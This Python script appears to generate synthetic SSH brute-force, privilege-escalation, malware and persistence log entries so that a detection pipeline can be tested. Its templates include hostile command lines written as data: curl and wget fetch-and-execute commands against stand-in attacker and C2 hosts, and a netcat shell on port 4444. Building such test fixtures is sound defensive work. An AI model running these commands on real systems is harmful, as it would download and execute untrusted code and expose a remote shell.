

import os
import sys
from datetime import datetime, timedelta
import random
import argparse
from pathlib import Path

# ─────────────────────────────────────────────────────────────────────────────
# Test Log Entry Templates (Realistic Attack Scenarios)
# ─────────────────────────────────────────────────────────────────────────────

AUTH_LOG_TEMPLATES = {
    # Stage 1: Port Scan / Reconnaissance
    "port_scan": [
        "Failed password for invalid user admin from {ip} port {port} ssh2",
        "Failed password for invalid user root from {ip} port {port} ssh2",
        "Failed password for invalid user test from {ip} port {port} ssh2",
    ],
    
    # Stage 2: Brute Force Attack
    "brute_force_ssh": [
        "Failed password for {user} from {ip} port {port} ssh2",
        "Failed password for {user} from {ip} port {port} ssh2",
        "Failed password for {user} from {ip} port {port} ssh2",
        "Failed password for {user} from {ip} port {port} ssh2",
        "Failed password for {user} from {ip} port {port} ssh2",
    ],
    
    # Stage 3: Successful Root Login
    "successful_root_login": [
        "Accepted password for root from {ip} port {port} ssh2",
        "pam_unix(sshd:session): session opened for user root by (uid=0)",
    ],
    
    # Stage 4: Privilege Escalation
    "privilege_escalation": [
        "sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
        "sudo: pam_unix(sudo:auth): authentication failure; logname={user} uid=1000 euid=0",
        "sudo: {user} : authentication failure",
    ],
    
    # Stage 5: Malware Execution
    "malware_process": [
        "systemd[1]: Starting Download and Execute Payload...",
        "curl http://malware.example.com/payload.sh | bash",
        "wget http://attacker.com/bot.py && python bot.py",
        "Executed command: nc -lvp 4444 -e /bin/bash",
    ],
    
    # Stage 6: Persistence (Cron Modification)
    "cron_modification": [
        "(root) CMD root",
        "CRON[15234]: (root) CMD (curl http://c2.example.com/checkin)",
        "CRON[15235]: (root) CMD (/usr/bin/wget -q http://c2.example.com/task -O /tmp/t.sh && bash /tmp/t.sh)",
    ],
}

SYSLOG_TEMPLATES = {
    "process_execution": [
        "kernel: [12345.678901] audit: type=EXECVE msg=audit(1234567890.123:456): argc=2 a0=\"/usr/bin/nc\" a1=\"-lvp\" a2=\"4444\"",
        "Process: ncat started on port 4444 by uid 0",
        "systemd: Started malicious service",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
# Attack Scenario Data
# ─────────────────────────────────────────────────────────────────────────────

ATTACKER_IPS = [
    "203.0.113.45",
    "198.51.100.89",
    "192.0.2.123",
    "198.18.0.99",
]

USERS = ["admin", "ubuntu", "ec2-user", "webapp", "app"]
PORTS = [22, 2222, 10022]

# ─────────────────────────────────────────────────────────────────────────────
# Log Generation Functions
# ─────────────────────────────────────────────────────────────────────────────

def generate_timestamp(minutes_ago=0):
    """Generate realistic timestamp for log entry."""
    dt = datetime.now() - timedelta(minutes=minutes_ago)
    return dt.strftime("%b %d %H:%M:%S")

def generate_auth_logs(count=66):
    """Generate realistic authentication attack logs."""
    logs = []
    minute = 0
    
    # Stage 1: Port scan attempts (5 minutes)
    print("[*] Stage 1: Port Scan Simulation (5 entries)")
    for i in range(5):
        template = random.choice(AUTH_LOG_TEMPLATES["port_scan"])
        ip = random.choice(ATTACKER_IPS)
        port = random.choice(PORTS)
        timestamp = generate_timestamp(minute)
        entry = f"{timestamp} server sshd[{1000+i}]: {template.format(ip=ip, port=port)}"
        logs.append(entry)
        minute += 1
    
    # Stage 2: Brute force attempts (15 minutes, 50 attempts)
    print("[*] Stage 2: Brute Force Attack (50 entries)")
    for i in range(50):
        template = random.choice(AUTH_LOG_TEMPLATES["brute_force_ssh"])
        ip = random.choice(ATTACKER_IPS)
        port = random.choice(PORTS)
        user = random.choice(USERS)
        timestamp = generate_timestamp(minute)
        entry = f"{timestamp} server sshd[{1000+5+i}]: {template.format(ip=ip, port=port, user=user)}"
        logs.append(entry)
        minute += 1
    
    # Stage 3: Successful root login (1 entry)
    print("[*] Stage 3: Successful Root Login (1 entry)")
    template = random.choice(AUTH_LOG_TEMPLATES["successful_root_login"])
    ip = random.choice(ATTACKER_IPS)
    port = random.choice(PORTS)
    timestamp = generate_timestamp(minute)
    entry = f"{timestamp} server sshd[1055]: {template.format(ip=ip, port=port)}"
    logs.append(entry)
    minute += 1
    
    # Stage 4: Privilege escalation (3 entries)
    print("[*] Stage 4: Privilege Escalation (3 entries)")
    for i in range(3):
        template = random.choice(AUTH_LOG_TEMPLATES["privilege_escalation"])
        user = "ubuntu"
        timestamp = generate_timestamp(minute)
        entry = f"{timestamp} server sudo: {template.format(user=user)}"
        logs.append(entry)
        minute += 1
    
    # Stage 5: Malware execution (4 entries)
    print("[*] Stage 5: Malware Execution (4 entries)")
    for i in range(4):
        template = random.choice(AUTH_LOG_TEMPLATES["malware_process"])
        timestamp = generate_timestamp(minute)
        entry = f"{timestamp} server kernel: {template}"
        logs.append(entry)
        minute += 1
    
    # Stage 6: Cron modification (2 entries)
    print("[*] Stage 6: Persistence - Cron Modification (2 entries)")
    for i in range(2):
        template = random.choice(AUTH_LOG_TEMPLATES["cron_modification"])
        timestamp = generate_timestamp(minute)
        entry = f"{timestamp} server CRON[{15234+i}]: {template}"
        logs.append(entry)
        minute += 1
    
    return logs

def generate_syslog_entries(count=1):
    """Generate syslog entries."""
    logs = []
    
    print("[*] Syslog: Process Execution Logs (1 entry)")
    template = random.choice(SYSLOG_TEMPLATES["process_execution"])
    timestamp = generate_timestamp(0)
    entry = f"{timestamp} server {template}"
    logs.append(entry)
    
    return logs

def inject_logs(auth_log_path, syslog_path, dry_run=False):
    """
    Inject generated logs into test files.
    
    Args:
        auth_log_path: Path to auth.log file (will be created if doesn't exist)
        syslog_path: Path to syslog file (will be created if doesn't exist)
        dry_run: If True, only print what would be written
    """
    
    # Create directories if they don't exist
    auth_log_dir = os.path.dirname(auth_log_path)
    syslog_dir = os.path.dirname(syslog_path)
    
    if auth_log_dir and not os.path.exists(auth_log_dir):
        if not dry_run:
            os.makedirs(auth_log_dir, exist_ok=True)
            print(f"[+] Created directory: {auth_log_dir}")
    
    if syslog_dir and not os.path.exists(syslog_dir):
        if not dry_run:
            os.makedirs(syslog_dir, exist_ok=True)
            print(f"[+] Created directory: {syslog_dir}")
    
    # Generate logs
    auth_logs = generate_auth_logs(66)
    syslog_logs = generate_syslog_entries(1)
    
    # Write auth.log
    print(f"\n[+] Writing {len(auth_logs)} entries to {auth_log_path}")
    if dry_run:
        print(f"    [DRY RUN] Would write to {auth_log_path}")
        for log in auth_logs[:3]:
            print(f"    {log}")
        print(f"    ... ({len(auth_logs)-3} more entries)")
    else:
        try:
            with open(auth_log_path, "w") as f:
                f.write("\n".join(auth_logs))
                f.write("\n")
            print(f"    ✓ Successfully wrote {len(auth_logs)} auth log entries")
        except Exception as e:
            print(f"    ✗ ERROR writing to {auth_log_path}: {e}")
            return False
    
    # Write syslog
    print(f"\n[+] Writing {len(syslog_logs)} entries to {syslog_path}")
    if dry_run:
        print(f"    [DRY RUN] Would write to {syslog_path}")
        for log in syslog_logs:
            print(f"    {log}")
    else:
        try:
            with open(syslog_path, "w") as f:
                f.write("\n".join(syslog_logs))
                f.write("\n")
            print(f"    ✓ Successfully wrote {len(syslog_logs)} syslog entries")
        except Exception as e:
            print(f"    ✗ ERROR writing to {syslog_path}: {e}")
            return False
    
    return True

def main():
    """Main entry point."""
    
    parser = argparse.ArgumentParser(
        description="Generate and inject realistic attack logs for testing (Windows-compatible)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Use default project-relative paths
  python inject_test_logs_windows.py
  
  # Specify custom paths
  python inject_test_logs_windows.py --auth-log ./test_logs/auth.log --syslog ./test_logs/syslog
  
  # Dry run (no files created)
  python inject_test_logs_windows.py --dry-run
        """
    )
    
    parser.add_argument(
        "--auth-log",
        default="./test_logs/auth.log",
        help="Path to auth.log file (default: ./test_logs/auth.log)"
    )
    parser.add_argument(
        "--syslog",
        default="./test_logs/syslog",
        help="Path to syslog file (default: ./test_logs/syslog)"
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Print what would be written without creating files"
    )
    
    args = parser.parse_args()
    
    print("=" * 70)
    print("WINDOWS-COMPATIBLE TEST LOG INJECTOR")
    print("=" * 70)
    print(f"\n[*] Configuration:")
    print(f"    Auth log path:  {args.auth_log}")
    print(f"    Syslog path:    {args.syslog}")
    print(f"    Dry run:        {args.dry_run}")
    print()
    
    success = inject_logs(args.auth_log, args.syslog, args.dry_run)
    
    if success:
        print("\n" + "=" * 70)
        print("[✓] Log injection completed successfully!")
        print("=" * 70)
        print("\nNext steps:")
        print(f"  1. Update config.py to use these log paths:")
        print(f"     LOG_PATHS = '{args.auth_log},{args.syslog}'")
        print(f"  2. Run detection pipeline:")
        print(f"     python -m tests.test_detection --log-paths '{args.auth_log},{args.syslog}'")
        return 0
    else:
        print("\n" + "=" * 70)
        print("[✗] Log injection failed!")
        print("=" * 70)
        return 1

if __name__ == "__main__":
    sys.exit(main())